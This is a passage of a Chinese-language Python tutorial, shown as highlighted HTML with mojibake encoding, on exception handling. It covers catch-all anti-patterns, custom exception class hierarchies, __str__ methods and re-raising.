<span class="hljs-keyword">try</span>:
    do_something()
<span class="hljs-keyword">except</span>:  <span class="hljs-comment"># åº”è¯¥æŒ‡å®šå¼‚å¸¸ç±»å‹</span>
    <span class="hljs-keyword">pass</span>
</code></pre>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># âŒ è¿‡äºå®½æ³›çš„å¼‚å¸¸æ•è·</span>
<span class="hljs-keyword">try</span>:
    process_data()
<span class="hljs-keyword">except</span> Exception:  <span class="hljs-comment"># åº”è¯¥æ•è·æ›´å…·ä½“çš„å¼‚å¸¸</span>
    <span class="hljs-keyword">pass</span>
</code></pre>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># âŒ å¿½ç•¥å¼‚å¸¸ä¿¡æ¯</span>
<span class="hljs-keyword">try</span>:
    risky_operation()
<span class="hljs-keyword">except</span> ValueError:
    <span class="hljs-keyword">pass</span>  <span class="hljs-comment"># æ²¡æœ‰è®°å½•æˆ–å¤„ç†å¼‚å¸¸ä¿¡æ¯</span>
</code></pre>
<h2 data-id="heading-15">4ã€å¼‚å¸¸æŠ›å‡ºçš„è‡ªå®šä¹‰</h2>
<ul>
<li>Pythonæ”¯æŒè‡ªå®šä¹‰å¼‚å¸¸æŠ›å‡ºï¼Œç»§æ‰¿Exceptionå³å¯ï¼Œå¾ˆç®€å•ã€‚</li>
</ul>
<h3 data-id="heading-16">4.1 ä»€ä¹ˆåœºæ™¯éœ€è¦è‡ªå®šä¹‰</h3>
<ul>
<li>æ˜¯å¦éœ€è¦è‡ªå®šä¹‰ï¼Œä¸»è¦çœ‹åœºæ™¯ï¼š
<ul>
<li>å°è„šæœ¬/ä¸´æ—¶ä»£ç  â†’ ç”¨å†…ç½®å¼‚å¸¸è¶³å¤Ÿ</li>
<li>ä¸šåŠ¡åº”ç”¨/æ¡†æ¶/åº“ â†’ å¿…é¡»å®šä¹‰è‡ªå®šä¹‰å¼‚å¸¸</li>
<li>ä¸­å¤§å‹é¡¹ç›® â†’ å»ºç«‹å®Œæ•´çš„å¼‚å¸¸å±‚æ¬¡ä½“ç³»</li>
</ul>
</li>
<li>åº”è¯¥è‡ªå®šä¹‰çš„åœºæ™¯ä¸¾ä¾‹</li>
</ul>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-code">        åœºæ™¯                 ç¤ºä¾‹                   åŸå›     
 1. ä¸šåŠ¡é¢†åŸŸé”™è¯¯       è®¢å•ä¸å­˜åœ¨ã€åº“å­˜ä¸è¶³      æ›´æ¸…æ™°è¡¨è¾¾ä¸šåŠ¡é€»è¾‘
 2. éœ€è¦æºå¸¦é¢å¤–ä¿¡æ¯	 é”™è¯¯ä»£ç ã€ä¸Šä¸‹æ–‡æ•°æ®	  å†…ç½®å¼‚å¸¸æ— æ³•æ‰¿è½½
 3. åˆ†å±‚å¼‚å¸¸å¤„ç†	     æ§åˆ¶å±‚ã€æœåŠ¡å±‚ã€æ•°æ®å±‚	  ä¸åŒå±‚å¤„ç†ä¸åŒå¼‚å¸¸
 4. æ¡†æ¶/åº“å¼€å‘	     Webæ¡†æ¶ã€ORM	         ç”¨æˆ·éœ€è¦åŒºåˆ†ä½ çš„å¼‚å¸¸
 5. éœ€è¦ç‰¹å®šæ¢å¤é€»è¾‘	 é‡è¯•ã€é™çº§	              ä¸åŒå¼‚å¸¸ä¸åŒå¤„ç†æ–¹å¼
</span></code></pre>
<h3 data-id="heading-17">4.2 è‡ªå®šä¹‰å¼‚å¸¸ç»§æ‰¿å±‚æ¬¡è®¾è®¡ç¤ºæ„</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># é¡¹ç›®ä¸­çš„å¼‚å¸¸ç»§æ‰¿å±‚æ¬¡ï¼ˆå‚è€ƒé¡¹ç›®ä»£ç ï¼‰</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">AgentError</span>(<span class="hljs-title class_ inherited__">Exception</span>):
    <span class="hljs-string">"""Agent åŸºç¡€å¼‚å¸¸ç±»ï¼Œ åç»­å¼‚å¸¸ç±»å‡ç»§æ‰¿äºæ­¤ï¼Œä¾¿äºç®¡ç†"""</span>
    <span class="hljs-keyword">pass</span>

<span class="hljs-keyword">class</span> <span class="hljs-title class_">ToolExecutionError</span>(<span class="hljs-title class_ inherited__">AgentError</span>):
    <span class="hljs-string">"""å·¥å…·æ‰§è¡Œå¼‚å¸¸"""</span>
    <span class="hljs-keyword">pass</span>

<span class="hljs-keyword">class</span> <span class="hljs-title class_">ToolValidationError</span>(<span class="hljs-title class_ inherited__">AgentError</span>):
    <span class="hljs-string">"""å·¥å…·å‚æ•°éªŒè¯å¼‚å¸¸"""</span>
    <span class="hljs-keyword">pass</span>

<span class="hljs-keyword">class</span> <span class="hljs-title class_">APIError</span>(<span class="hljs-title class_ inherited__">AgentError</span>):
    <span class="hljs-string">"""API è°ƒç”¨å¼‚å¸¸"""</span>
    <span class="hljs-keyword">pass</span>

<span class="hljs-keyword">class</span> <span class="hljs-title class_">MaxIterationsExceededError</span>(<span class="hljs-title class_ inherited__">AgentError</span>):
    <span class="hljs-string">"""è¶…è¿‡æœ€å¤§è¿­ä»£æ¬¡æ•°å¼‚å¸¸"""</span>
    <span class="hljs-keyword">pass</span>
</code></pre>
<h3 data-id="heading-18">4.3 å¼‚å¸¸æŠ›å‡º è‡ªå®šä¹‰çš„ä¸‰ç§å±‚æ¬¡</h3>
<ul>
<li>ç®€å•ç»§æ‰¿ï¼ˆç©ºå¼‚å¸¸ç±»ï¼‰
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyError</span>(<span class="hljs-title class_ inherited__">Exception</span>):
    <span class="hljs-string">"""è‡ªå®šä¹‰å¼‚å¸¸åŸºç±»"""</span>        <span class="hljs-comment"># ç»§æ‰¿è‡ªException</span>
    <span class="hljs-keyword">pass</span>

<span class="hljs-keyword">class</span> <span class="hljs-title class_">SimpleError</span>(<span class="hljs-title class_ inherited__">MyError</span>):
    <span class="hljs-keyword">pass</span>
</code></pre>
</li>
<li>å¸¦æ„é€ å‡½æ•°çš„å¼‚å¸¸
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyError</span>(<span class="hljs-title class_ inherited__">Exception</span>):
    <span class="hljs-string">"""è‡ªå®šä¹‰å¼‚å¸¸åŸºç±»"""</span>        <span class="hljs-comment"># ç»§æ‰¿è‡ªException</span>
    <span class="hljs-keyword">pass</span>

<span class="hljs-keyword">class</span> <span class="hljs-title class_">DetailedError</span>(<span class="hljs-title class_ inherited__">MyError</span>):
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, message: <span class="hljs-built_in">str</span>, code: <span class="hljs-built_in">int</span></span>):
        self.message = message
        self.code = code
        <span class="hljs-built_in">super</span>().__init__(<span class="hljs-string">f"é”™è¯¯ <span class="hljs-subst">{code}</span>: <span class="hljs-subst">{message}</span>"</span>)
</code></pre>
</li>
<li>å®Œæ•´çš„å¼‚å¸¸ç±»ï¼ˆå¸¦å¤šä¸ªæ–¹æ³•ï¼‰
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyError</span>(<span class="hljs-title class_ inherited__">Exception</span>):
    <span class="hljs-string">"""è‡ªå®šä¹‰å¼‚å¸¸åŸºç±»"""</span>        <span class="hljs-comment"># ç»§æ‰¿è‡ªException</span>
    <span class="hljs-keyword">pass</span>

<span class="hljs-keyword">class</span> <span class="hljs-title class_">FullFeaturedError</span>(<span class="hljs-title class_ inherited__">MyError</span>):
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, message: <span class="hljs-built_in">str</span>, details: <span class="hljs-built_in">dict</span></span>):
        self.message = message
        self.details = details
        <span class="hljs-built_in">super</span>().__init__(message)
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__str__</span>(<span class="hljs-params">self</span>):
        <span class="hljs-keyword">return</span> <span class="hljs-string">f"[<span class="hljs-subst">{self.message}</span>] è¯¦æƒ…: <span class="hljs-subst">{self.details}</span>"</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_details</span>(<span class="hljs-params">self</span>):
        <span class="hljs-keyword">return</span> self.details
</code></pre>
</li>
</ul>
<h3 data-id="heading-19">4.4 è‡ªå®šä¹‰ä¸ä½¿ç”¨</h3>
<ul>
<li>
<p>å¦‚éœ€æŠ›å‡ºå¼‚å¸¸æ—¶è‡ªåŠ¨å¤„ç†æŸäº›å‚æ•°ï¼Œæˆ–è€…ç»™å¼‚å¸¸ç»‘å®šç‰¹å®šçš„å˜é‡ï¼Œåˆ™éœ€è¦æ›¿æ¢ pass ä¸ºå…·ä½“ä»£ç ï¼ˆé€šå¸¸æ˜¯ <strong>init</strong> æ–¹æ³•ï¼‰ã€‚ä»£ç ç¤ºä¾‹å¦‚ä¸‹</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyError</span>(<span class="hljs-title class_ inherited__">Exception</span>):
    <span class="hljs-string">"""è¿™é‡Œéœ€è¦æ›¿æ¢ passï¼Œå¡«å†™å…·ä½“é€»è¾‘"""</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, message, error_code, tm</span>):
        <span class="hljs-built_in">super</span>().__init__(message)       <span class="hljs-comment"># åˆå§‹åŒ–çˆ¶ç±»</span>
        self.error_code = error_code    <span class="hljs-comment"># æ·»åŠ è‡ªå®šä¹‰å±æ€§</span>
        self.tm = tm

<span class="hljs-comment"># å°è£… raise é€»è¾‘</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">fail_fast</span>(<span class="hljs-params">message, error_code, tm</span>):
    <span class="hljs-comment"># raise ä¾ç„¶å­˜åœ¨äºè¿™é‡Œï¼Œåªæ˜¯è¢«è—èµ·æ¥äº†</span>
    <span class="hljs-keyword">raise</span> MyError(message, error_code, tm)

<span class="hljs-comment"># å¼‚å¸¸æŠ›å‡ºçš„ä½¿ç”¨</span>
<span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> datetime
<span class="hljs-keyword">try</span>:
    <span class="hljs-string">'''
    å¸¸è§„å‡½æ•°ä½“ï¼ŒåŠåˆ¤å®šé€»è¾‘
    å¯ä»¥ç»“åˆ if ç­‰åˆ¤å®šé€»è¾‘è¿›è¡Œ
    '''</span>
    current_datetime = datetime.now()   <span class="hljs-comment"># è·å–å½“å‰çš„æ—¥æœŸå’Œæ—¶é—´</span>
    formatted_datetime = current_datetime.strftime(<span class="hljs-string">"%Y-%m-%d %H:%M:%S.%f"</span>)[:]   <span class="hljs-comment"># å°†datetimeå¯¹è±¡è½¬æ¢ä¸ºè‡ªå®šä¹‰çš„å­—ç¬¦ä¸²æ ¼å¼</span>
    
    <span class="hljs-keyword">raise</span> MyError(<span class="hljs-string">"ç³»ç»Ÿå´©æºƒäº†"</span>, <span class="hljs-number">500</span>, formatted_datetime)
    <span class="hljs-comment"># æˆ–è€… fail_fast("ç³»ç»Ÿå´©æºƒäº†", 500, formatted_datetime) </span>
<span class="hljs-keyword">except</span> MyError <span class="hljs-keyword">as</span> e:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"é”™è¯¯ä¿¡æ¯: <span class="hljs-subst">{e}</span>, é”™è¯¯ä»£ç : <span class="hljs-subst">{e.error_code}</span>, é”™è¯¯æ—¶é—´ï¼š<span class="hljs-subst">{e.tm}</span>"</span>)
</code></pre>
</li>
<li>
<p>ç±»çš„ <code>__str__(self)</code> é­”æœ¯æ–¹æ³•çš„ä½¿ç”¨</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># å®šä¹‰è‡ªå®šä¹‰å¼‚å¸¸ç±»</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">MyError</span>(<span class="hljs-title class_ inherited__">Exception</span>):
    <span class="hljs-string">"""è‡ªå®šä¹‰å¼‚å¸¸åŸºç±»"""</span>
    <span class="hljs-keyword">pass</span>

<span class="hljs-keyword">class</span> <span class="hljs-title class_">APIError</span>(<span class="hljs-title class_ inherited__">MyError</span>):
    <span class="hljs-string">"""API è°ƒç”¨å¼‚å¸¸"""</span>
    <span class="hljs-comment"># æ„é€ æ–¹æ³•ï¼Œåˆ›å»ºå¯¹è±¡æ—¶è‡ªåŠ¨è°ƒç”¨ï¼Œåˆå§‹åŒ–å¯¹è±¡å±æ€§</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, message: <span class="hljs-built_in">str</span>, status_code: <span class="hljs-built_in">int</span> = <span class="hljs-literal">None</span></span>):
        <span class="hljs-built_in">super</span>().__init__(message)       <span class="hljs-comment"># è°ƒç”¨çˆ¶ç±»çš„ __init__ æ–¹æ³•</span>
        self.status_code = status_code  <span class="hljs-comment"># ç„¶åå†æ·»åŠ å­ç±»ç‰¹æœ‰å±æ€§</span>
    
    <span class="hljs-comment"># Python ä¸€ä¸ªç‰¹æ®Šæ–¹æ³•ï¼ˆé­”æœ¯æ–¹æ³•ï¼‰ï¼Œç”¨äºå®šä¹‰å¯¹è±¡çš„å­—ç¬¦ä¸²è¡¨ç¤ºå½¢å¼ã€‚</span>
    <span class="hljs-comment"># å½“éœ€è¦å°†å¯¹è±¡è½¬æ¢ä¸ºå­—ç¬¦ä¸²æ—¶ï¼ŒPython ä¼šè‡ªåŠ¨è°ƒç”¨ __str__() æ–¹æ³•ï¼š</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__str__</span>(<span class="hljs-params">self</span>):
        <span class="hljs-keyword">if</span> self.status_code:        <span class="hljs-comment"># å¤„ç½®çµæ´»</span>
            <span class="hljs-keyword">return</span> <span class="hljs-string">f"APIé”™è¯¯ <span class="hljs-subst">{self.status_code}</span>: <span class="hljs-subst">{self.message}</span>"</span>
        <span class="hljs-keyword">return</span> <span class="hljs-string">f"APIé”™è¯¯: <span class="hljs-subst">{self.message}</span>"</span>

<span class="hljs-comment"># ä½¿ç”¨è‡ªå®šä¹‰å¼‚å¸¸</span>
<span class="hljs-keyword">try</span>:
    <span class="hljs-keyword">raise</span> APIError(<span class="hljs-string">"ç½‘ç»œè¯·æ±‚å¤±è´¥"</span>, status_code=<span class="hljs-number">500</span>)
<span class="hljs-keyword">except</span> APIError <span class="hljs-keyword">as</span> e:
    <span class="hljs-built_in">print</span>(e)  <span class="hljs-comment"># APIé”™è¯¯ 500: ç½‘ç»œè¯·æ±‚å¤±è´¥</span>
</code></pre>
<ul>
<li><code>__str__()</code> çš„ 8 ç§è‡ªåŠ¨è§¦å‘æ¡ä»¶
<ul>
<li>æ¡ä»¶1: ä½¿ç”¨ print() å‡½æ•°
<pre><code class="hljs language-python" lang="python">obj = SomeObject()<span class="hljs-built_in">print</span>(obj)  <span class="hljs-comment"># â† è§¦å‘ __str__()</span>
</code></pre>
</li>
<li>æ¡ä»¶2: ä½¿ç”¨ str() æ˜¾å¼è½¬æ¢
<pre><code class="hljs language-python" lang="python">obj = SomeObject()str_obj = <span class="hljs-built_in">str</span>(obj)  <span class="hljs-comment"># â† è§¦å‘ __str__()</span>
</code></pre>
</li>
<li>æ¡ä»¶3: f-string å­—ç¬¦ä¸²æ ¼å¼åŒ–
<pre><code class="hljs language-python" lang="python">obj = SomeObject()message = <span class="hljs-string">f"ç»“æœ: <span class="hljs-subst">{obj}</span>"</span>  <span class="hljs-comment"># â† è§¦å‘ __str__()</span>
</code></pre>
</li>
<li>æ¡ä»¶4: .format() æ–¹æ³•æ ¼å¼åŒ–
<pre><code class="hljs language-python" lang="python">obj = SomeObject()message = <span class="hljs-string">"ç»“æœ: {}"</span>.<span class="hljs-built_in">format</span>(obj)  <span class="hljs-comment"># â† è§¦å‘ __str__()</span>
</code></pre>
</li>
<li>æ¡ä»¶5: % æ ¼å¼åŒ–
<pre><code class="hljs language-python" lang="python">obj = SomeObject()message = <span class="hljs-string">"ç»“æœ: %s"</span> % obj  <span class="hljs-comment"># â† è§¦å‘ __str__()</span>
</code></pre>
</li>
<li>æ¡ä»¶6: å­—ç¬¦ä¸²æ‹¼æ¥ï¼ˆéœ€è¦æ˜¾å¼è½¬æ¢ï¼‰
<pre><code class="hljs language-python" lang="python">obj = SomeObject()message = <span class="hljs-string">"ç»“æœ: "</span> + <span class="hljs-built_in">str</span>(obj)  <span class="hljs-comment"># â† str() è§¦å‘ __str__()</span>
</code></pre>
</li>
<li>æ¡ä»¶7: æ—¥å¿—è®°å½•
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> loggingobj = SomeObject()logging.info(<span class="hljs-string">f"æ—¥å¿—ä¿¡æ¯: <span class="hljs-subst">{obj}</span>"</span>)  <span class="hljs-comment"># â† è§¦å‘ __str__()</span>
</code></pre>
</li>
<li>æ¡ä»¶8: è¿”å›å­—ç¬¦ä¸²çš„å‡½æ•°/æ–¹æ³•ä¸­
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_description</span>(<span class="hljs-params">obj</span>):    <span class="hljs-keyword">return</span> <span class="hljs-string">f"æè¿°: <span class="hljs-subst">{obj}</span>"</span>  <span class="hljs-comment"># â† è§¦å‘ __str__()</span>
</code></pre>
</li>
</ul>
</li>
</ul>
</li>
<li>
<p>æ•æ‰å¼‚å¸¸è¿›ä¸€æ­¥å“åº”åï¼ŒæŠ›å‡ºæ•è·çš„å¼‚å¸¸ï¼Œæˆ–å‘ä¸Šä¼ é€’</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>() -&gt; <span class="hljs-literal">None</span>:
    <span class="hljs-string">"""æ¼”ç¤ºå¼‚å¸¸çš„ä½¿ç”¨å’Œå¤„ç†ã€‚"""</span>
    <span class="hljs-keyword">try</span>:
        current_datetime = datetime.now()        <span class="hljs-comment"># æ¨¡æ‹Ÿä¸šåŠ¡é€»è¾‘</span>
        formatted_datetime = current_datetime.isoformat()
        <span class="hljs-keyword">raise</span> MyError(<span class="hljs-string">"ç³»ç»Ÿå´©æºƒäº†"</span>, <span class="hljs-number">500</span>, formatted_datetime)        <span class="hljs-comment"># æŠ›å‡ºå¼‚å¸¸</span>
    <span class="hljs-keyword">except</span> MyError <span class="hljs-keyword">as</span> e:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"é”™è¯¯ä»£ç : <span class="hljs-subst">{e.error_code}</span>"</span>)    <span class="hljs-comment"># è®°å½•é”™è¯¯ä¿¡æ¯</span>

        <span class="hljs-keyword">raise</span>        <span class="hljs-comment"># å‘ä¸Šä¼ é€’å¼‚å¸¸</span>
        <span class="hljs-comment"># [æˆ–è€…] raise  æ–°å¼‚å¸¸ from åŸå§‹å¼‚å¸¸</span>

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    <span class="hljs-keyword">try</span>:
        main()
    <span class="hljs-keyword">except</span> MyError <span class="hljs-keyword">as</span> e:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"\næœ€ç»ˆæ•è·çš„é”™è¯¯: <span class="hljs-subst">{e}</span>"</span>)
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"é”™è¯¯ä»£ç : <span class="hljs-subst">{e.error_code}</span>"</span>)
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"é”™è¯¯æ—¶é—´: <span class="hljs-subst">{e.timestamp}</span>"</span>)
</code></pre>
</li>
<li>
<p>è‡ªå®šä¹‰å¼‚å¸¸æŠ›å‡º raise</p>
<ul>
<li>è‡ªå®šä¹‰çš„å¼‚å¸¸ï¼Œraise å¿…é¡»æ˜¾å¼å‡ºç°ã€‚å› ä¸º Python åªèƒ½è‡ªåŠ¨æŠ›å‡ºâ€œå†…ç½®å¼‚å¸¸â€ï¼Œä¸”ä¸çŸ¥é“â€œä¸šåŠ¡é€»è¾‘â€ï¼Œ</li>
<li>è™½ç„¶ raise å¿…é¡»å­˜åœ¨ï¼Œä½†å¯ä»¥è€ƒè™‘åœ¨ ç±»å¤–æˆ–è€… æŠ›å‡ºå¼‚å¸¸ çš„ç±»è‡ªå®šä¹‰è¿‡ç¨‹ä¸­ï¼Œå°†ä¹‹å°è£…åœ¨å‡½æ•°ä¸­ï¼Œç„¶åä¸šåŠ¡ä»£ç éœ€è¦å¤„ç†æŠ›å‡ºæ—¶ç›´æ¥åšå‡½æ•°è°ƒç”¨ï¼Œä»¥æ­¤å®ç° raise æ‰§è¡Œã€‚ä»£ç ç¤ºä¾‹å¦‚ä¸Šè¿° fail_fast() å‡½æ•°ã€‚</li>
</ul>
</li>
</ul>
<h3 data-id="heading-20">4.5 å¼‚å¸¸æŠ›å‡ºè‡ªå®šä¹‰çš„ä¼˜åŠ¿</h3>
<ul>
<li>
<p>æ¦‚æ‹¬</p>
<ul>
<li>1ã€ğŸ’¡ è¯­ä¹‰æ¸…æ™°</li>
<li>2ã€ğŸ’¡ æºå¸¦ä¸Šä¸‹æ–‡</li>
<li>3ã€ğŸ’¡ ç²¾ç¡®æ•è·</li>
<li>4ã€ğŸ’¡ åˆ†å±‚å¤„ç†</li>
<li>5ã€ğŸ’¡ APIè®¾è®¡</li>
</ul>
</li>
<li>
<p>ä¼˜åŠ¿1ï¼šè¯­ä¹‰æ›´æ¸…æ™° ğŸ“–</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># âŒ ä½¿ç”¨å†…ç½®å¼‚å¸¸ï¼ˆä¸æ¸…æ™°ï¼‰</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">divide</span>(<span class="hljs-params">a, b</span>):
    <span class="hljs-keyword">if</span> b == <span class="hljs-number">0</span>:
        <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">"é™¤æ•°ä¸èƒ½ä¸ºé›¶"</span>)  <span class="hljs-comment"># å¤ªæ³›åŒ–</span>

<span class="hljs-comment"># âœ… ä½¿ç”¨è‡ªå®šä¹‰å¼‚å¸¸ï¼ˆæ¸…æ™°ï¼‰</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">DivisionByZeroError</span>(<span class="hljs-title class_ inherited__">Exception</span>):
    <span class="hljs-string">"""é™¤é›¶é”™è¯¯"""</span>
    <span class="hljs-keyword">pass</span>

<span class="hljs-keyword">def</span> <span class="hljs-title function_">divide</span>(<span class="hljs-params">a, b</span>):
    <span class="hljs-keyword">if</span> b == <span class="hljs-number">0</span>:
        <span class="hljs-keyword">raise</span> DivisionByZeroError(<span class="hljs-string">f"<span class="hljs-subst">{a}</span> ä¸èƒ½é™¤ä»¥ <span class="hljs-subst">{b}</span>"</span>)  <span class="hljs-comment"># è¯­ä¹‰æ˜ç¡®</span>

<span class="hljs-comment"># ä½¿ç”¨æ—¶</span>
<span class="hljs-keyword">try</span>:
    result = divide(<span class="hljs-number">10</span>, <span class="hljs-number">0</span>)
<span class="hljs-keyword">except</span> DivisionByZeroError:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"é™¤é›¶é”™è¯¯ï¼Œè¯·æ£€æŸ¥è¾“å…¥"</span>)  <span class="hljs-comment"># ç²¾ç¡®å¤„ç†</span>
<span class="hljs-keyword">except</span> ValueError:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"å…¶ä»–å‚æ•°é”™è¯¯"</span>)
</code></pre>
</li>
<li>
<p>ä¼˜åŠ¿2ï¼šæºå¸¦é¢å¤–ä¸Šä¸‹æ–‡ ğŸ’</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># ä¼˜åŠ¿ï¼šå†…ç½®å¼‚å¸¸æ— æ³•è¿™æ ·æºå¸¦ç»“æ„åŒ–æ•°æ®ï¼</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">ToolExecutionError</span>(<span class="hljs-title class_ inherited__">Exception</span>):
    <span class="hljs-string">"""å·¥å…·æ‰§è¡Œå¼‚å¸¸"""</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, tool_name: <span class="hljs-built_in">str</span>, error: <span class="hljs-built_in">str</span></span>):
        self.tool_name = tool_name      <span class="hljs-comment"># é¢å¤–ä¿¡æ¯ï¼šå·¥å…·å</span>
        self.error = error              <span class="hljs-comment"># é¢å¤–ä¿¡æ¯ï¼šé”™è¯¯è¯¦æƒ…</span>
        <span class="hljs-built_in">super</span>().__init__(<span class="hljs-string">f"å·¥å…· '<span class="hljs-subst">{tool_name}</span>' æ‰§è¡Œå¤±è´¥: <span class="hljs-subst">{error}</span>"</span>)

<span class="hljs-comment"># ä½¿ç”¨</span>
<span class="hljs-keyword">try</span>:
    execute_tool(<span class="hljs-string">"add"</span>, {<span class="hljs-string">"a"</span>: <span class="hljs-number">1</span>, <span class="hljs-string">"b"</span>: <span class="hljs-string">"two"</span>})
    <span class="hljs-comment">#  å‡½æ•°ä½“å†…éœ€è¦èƒ½å¤Ÿ raise ToolExecutionErrorï¼Œè‡ªå®šä¹‰ å¼‚å¸¸æŠ›å‡º ä½¿ç”¨æ—¶çš„å‰ç½®æ¡ä»¶</span>
<span class="hljs-keyword">except</span> ToolExecutionError <span class="hljs-keyword">as</span> e:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"å·¥å…·: <span class="hljs-subst">{e.tool_name}</span>"</span>)       <span class="hljs-comment"># è®¿é—®é¢å¤–ä¿¡æ¯</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"é”™è¯¯: <span class="hljs-subst">{e.error}</span>"</span>)
    <span class="hljs-comment"># å¯ä»¥é’ˆå¯¹ä¸åŒå·¥å…·é‡‡å–ä¸åŒæ¢å¤ç­–ç•¥</span>
    <span class="hljs-keyword">if</span> e.tool_name == <span class="hljs-string">"add"</span>:
        retry_with_defaults()
    <span class="hljs-keyword">else</span>:
        log_error()
</code></pre>
</li>
<li>
<p>ä¼˜åŠ¿3ï¼šç²¾ç¡®çš„å¼‚å¸¸æ•è· ğŸ¯</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># å®šä¹‰å¼‚å¸¸å±‚æ¬¡</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">AgentError</span>(<span class="hljs-title class_ inherited__">Exception</span>):
    <span class="hljs-string">"""AgentåŸºç¡€å¼‚å¸¸"""</span>
    <span class="hljs-keyword">pass</span>

<span class="hljs-keyword">class</span> <span class="hljs-title class_">ToolError</span>(<span class="hljs-title class_ inherited__">AgentError</span>):
    <span class="hljs-string">"""å·¥å…·ç›¸å…³å¼‚å¸¸"""</span>
    <span class="hljs-keyword">pass</span>

<span class="hljs-keyword">class</span> <span class="hljs-title class_">APIError</span>(<span class="hljs-title class_ inherited__">AgentError</span>):
    <span class="hljs-string">"""APIç›¸å…³å¼‚å¸¸"""</span>
    <span class="hljs-keyword">pass</span>

<span class="hljs-keyword">class</span> <span class="hljs-title class_">ConfigError</span>(<span class="hljs-title class_ inherited__">AgentError</span>):
    <span class="hljs-string">"""é…ç½®ç›¸å…³å¼‚å¸¸"""</span>
    <span class="hljs-keyword">pass</span>

<span class="hljs-comment"># ç²¾ç¡®æ•è·</span>
<span class="hljs-keyword">try</span>:
    agent.run()
<span class="hljs-keyword">except</span> ToolError:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"å·¥å…·é”™è¯¯ï¼Œé‡è¯•..."</span>)
<span class="hljs-keyword">except</span> APIError:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"APIé”™è¯¯ï¼Œåˆ‡æ¢å¤‡ç”¨æœåŠ¡å™¨..."</span>)
<span class="hljs-keyword">except</span> ConfigError:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"é…ç½®é”™è¯¯ï¼Œè¯·æ£€æŸ¥é…ç½®æ–‡ä»¶"</span>)
<span class="hljs-keyword">except</span> AgentError:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"å…¶ä»–Agenté”™è¯¯"</span>)
</code></pre>
<ul>
<li>å¯¹æ¯”å†…ç½®å¼‚å¸¸ï¼š
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># âŒ æ‰€æœ‰éƒ½å¯èƒ½æ˜¯ValueErrorï¼Œæ— æ³•åŒºåˆ†</span>
<span class="hljs-keyword">try</span>:
    agent.run()
<span class="hljs-keyword">except</span> ValueError <span class="hljs-keyword">as</span> e:
    <span class="hljs-comment"># è¿™ä¸ªValueErrorå¯èƒ½æ˜¯å·¥å…·é”™è¯¯ã€APIé”™è¯¯æˆ–é…ç½®é”™è¯¯</span>
    <span class="hljs-comment"># æ— æ³•ç²¾ç¡®å¤„ç†ï¼</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"å‘ç”Ÿé”™è¯¯:"</span>, e)
</code></pre>
</li>
</ul>
</li>
<li>
<p>ä¼˜åŠ¿4ï¼šåˆ†å±‚å¼‚å¸¸å¤„ç† ğŸ—ï¸</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># ä¼˜åŠ¿ï¼šä¸åŒå±‚çœ‹åˆ°ä¸åŒæŠ½è±¡çº§åˆ«çš„å¼‚å¸¸ï¼</span>
<span class="hljs-comment"># æŒ‰å±‚æ¬¡å®šä¹‰å¼‚å¸¸</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">UserError</span>(<span class="hljs-title class_ inherited__">Exception</span>):
    <span class="hljs-string">"""ç”¨æˆ·å±‚å¼‚å¸¸ï¼ˆç›´æ¥å±•ç¤ºç»™ç”¨æˆ·ï¼‰"""</span>
    <span class="hljs-keyword">pass</span>

<span class="hljs-keyword">class</span> <span class="hljs-title class_">BusinessError</span>(<span class="hljs-title class_ inherited__">Exception</span>):
